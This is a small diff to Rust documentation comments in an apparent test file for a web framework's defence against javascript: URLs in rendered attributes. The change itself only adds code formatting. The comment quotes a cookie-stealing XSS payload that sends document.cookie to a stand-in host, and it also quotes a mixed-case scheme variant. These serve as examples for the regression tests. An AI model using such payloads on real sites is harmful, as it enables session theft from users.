@@ -6,7 +6,7 @@
 //! signed a guestbook with `author=javascript:fetch('//evil.example/?c='+document.cookie)`
 //! and a page rendering `<a href={entry.author}>` served it verbatim — and
 //! ` JaVaScRiPt:alert(1)` too, which the browser's URL parser normalises to the
-//! same scheme. The session cookie is HttpOnly, but `__ALBEDO_CSRF__` is on the
+//! same scheme. The session cookie is `HttpOnly`, but `__ALBEDO_CSRF__` is on the
 //! page, so the script could call every action as the victim. React 19 replaces
 //! these; nothing here did.
 //!
@@ -14,7 +14,7 @@
 //!
 //! The rule lives once, in `runtime::jsx_attributes`, and six sites apply it.
 //! This file runs the three that execute on the server or ship from it: the
-//! pure-Rust evaluator, the QuickJS `h` shim, and the list templater's rows
+//! pure-Rust evaluator, the `QuickJS` `h` shim, and the list templater's rows
 //! thunk (which the browser runs to rebuild a row from state). The client
 //! runtimes are covered by `tests/client_hydration.rs` and
 //! `tests/bakabox/script-url.test.mjs`; their copies of the table are pinned by
